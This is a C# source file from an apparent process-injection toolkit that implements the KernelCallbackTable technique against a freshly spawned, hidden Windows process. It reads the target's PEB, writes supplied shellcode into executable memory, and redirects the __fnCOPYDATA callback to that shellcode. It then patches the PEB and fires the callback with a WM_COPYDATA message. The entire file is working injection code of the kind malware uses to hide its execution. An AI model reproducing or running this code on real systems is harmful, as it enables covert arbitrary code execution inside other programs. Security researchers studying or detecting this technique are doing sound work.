using ProcessInjection.Native;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using static ProcessInjection.Native.Constants;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Win32API;
using static ProcessInjection.Utils.Utils;

namespace ProcessInjection.PInvoke
{
    public class KernelCallBackTable
    {

        public static IntPtr FindWindowByProcessId(int pid)
        {
            IntPtr foundHwnd = IntPtr.Zero;
            EnumWindows(delegate (IntPtr hWnd, IntPtr lParam)
            {
                uint windowPid;
                GetWindowThreadProcessId(hWnd, out windowPid);
                if (windowPid == pid)
                {
                    foundHwnd = hWnd;
                    return false; // Stop enumeration
                }
                return true; // Continue
            }, IntPtr.Zero);
            return foundHwnd;
        }

        public static void KernelCallbackTableInjection(byte[] buf, string processPath)
        {

            uint lpNumberOfBytesWritten = 0;

            STARTUPINFO si = new STARTUPINFO { cb = (uint)Marshal.SizeOf<STARTUPINFO>(), dwFlags = STARTF_USESHOWWINDOW, wShowWindow = SW_HIDE };
            PROCESS_INFORMATION pi;
            bool success = CreateProcess((IntPtr)0, processPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, IntPtr.Zero, ref si, out pi);
            var pid = pi.dwProcessId;
            if (success)
            {
                PrintInfo($"[!] Process {processPath} started with Process ID: {pi.dwProcessId}.");
            }
            else
            {
                PrintError($"[-] Failed to start the process {processPath}.");
            }

            WaitForInputIdle(pi.hProcess, 1000);


            IntPtr hWindow = FindWindowByProcessId(pi.dwProcessId);
            if (hWindow != IntPtr.Zero)
            {
                PrintInfo($"[!] Got the window handle {hWindow}");
            }
            else
            {
                PrintError($"[-] Failed to find the window for process id {pi.dwProcessId}");
            }
            PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
            IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
            PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");


            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            IntPtr pbiBuffer = Marshal.AllocHGlobal(Marshal.SizeOf<PROCESS_BASIC_INFORMATION>());
            int returnLength;
            var status = NtQueryInformationProcess(pHandle, ProcessBasicInformation, pbiBuffer, Marshal.SizeOf<PROCESS_BASIC_INFORMATION>(), out returnLength);
            if (status == NTSTATUS.Success)
            {

                pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(pbiBuffer);
                PrintInfo($"[!] Found the PEB Address {pbi.PebBaseAddress}");
                Marshal.FreeHGlobal(pbiBuffer);
            }
            else
            {
                PrintError($"[-] Failed to find the PEB Address");
            }

            PEB peb = new PEB();
            IntPtr pebBuffer = Marshal.AllocHGlobal(Marshal.SizeOf<PEB>());
            IntPtr bytesRead;
            success = ReadProcessMemory(pHandle, pbi.PebBaseAddress, pebBuffer, Marshal.SizeOf<PEB>(), out bytesRead);
            if (status == NTSTATUS.Success)
            {
                peb = Marshal.PtrToStructure<PEB>(pebBuffer);
                PrintInfo($"[+] Found the KernelCallbackTable Address {peb.KernelCallbackTable.ToInt64()}");
                Marshal.FreeHGlobal(pebBuffer);
            }
            else
            {
                PrintError($"[-] Failed to find the KernelCallbackTable Address");
            }


            KERNELCALLBACKTABLE kct = new KERNELCALLBACKTABLE();
            IntPtr kctBuffer = Marshal.AllocHGlobal(Marshal.SizeOf<KERNELCALLBACKTABLE>());
            success = ReadProcessMemory(pHandle, peb.KernelCallbackTable, kctBuffer, Marshal.SizeOf<KERNELCALLBACKTABLE>(), out bytesRead);
            if (status == NTSTATUS.Success)
            {
                kct = Marshal.PtrToStructure<KERNELCALLBACKTABLE>(kctBuffer);
                PrintInfo($"[+] Read the content from the KernelCallbackTable structure");
                Marshal.FreeHGlobal(kctBuffer);
            }
            else
            {
                PrintError($"[-] Failed to read the content from KernelCallbackTable structure.");
            }

            PrintInfo($"[!] Allocating memory to inject the shellcode.");
            IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");

            if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
            {
                PrintInfo($"[!] Shellcode written in the process memory.");
            }

            PrintInfo($"[!] Allocating memory to write the new KernelCallbackTable in the remote process.");
            IntPtr newKCTAddr = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)Marshal.SizeOf<KERNELCALLBACKTABLE>(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            PrintInfo($"[!] Memory for the new KernelCallbackTable allocated in the remote process.");
            kct.__fnCOPYDATA = rMemAddress;

            IntPtr tempBuffer = Marshal.AllocHGlobal(Marshal.SizeOf<KERNELCALLBACKTABLE>());
            Marshal.StructureToPtr(kct, tempBuffer, false);
            byte[] kctBytes = new byte[Marshal.SizeOf<KERNELCALLBACKTABLE>()];
            Marshal.Copy(tempBuffer, kctBytes, 0, kctBytes.Length);
            Marshal.FreeHGlobal(tempBuffer);

            if (WriteProcessMemory(pHandle, newKCTAddr, kctBytes, (uint)kctBytes.Length, ref lpNumberOfBytesWritten))
            {
                PrintInfo($"[!] __fnCOPYDATA {kct.__fnCOPYDATA} written in the target process memory.");
            }

            IntPtr pebKCTOffset = IntPtr.Add(pbi.PebBaseAddress, 0x58); // KernelCallbackTable offset for x64
            if (WriteProcessMemory(pHandle, pebKCTOffset, newKCTAddr, (uint)IntPtr.Size, ref lpNumberOfBytesWritten))
            {
                PrintInfo($"[!]Updated PEB with new KernelCallbackTable address");
            }

            PrintInfo($"[!] Triggering our shellcode.");
            string msg = "Pwn";
            byte[] msgBytes = Encoding.Unicode.GetBytes(msg);
            IntPtr msgBuffer = Marshal.AllocHGlobal(msgBytes.Length);
            Marshal.Copy(msgBytes, 0, msgBuffer, msgBytes.Length);
            COPYDATASTRUCT cds = new COPYDATASTRUCT
            {
                dwData = new IntPtr(1),
                cbData = (uint)msgBytes.Length,
                lpData = msgBuffer
            };
            SendMessage(hWindow, WM_COPYDATA, hWindow, ref cds);
            PrintInfo($"[!] Shellcode triggered successfully.");
            Marshal.FreeHGlobal(msgBuffer);


        }
    }
}
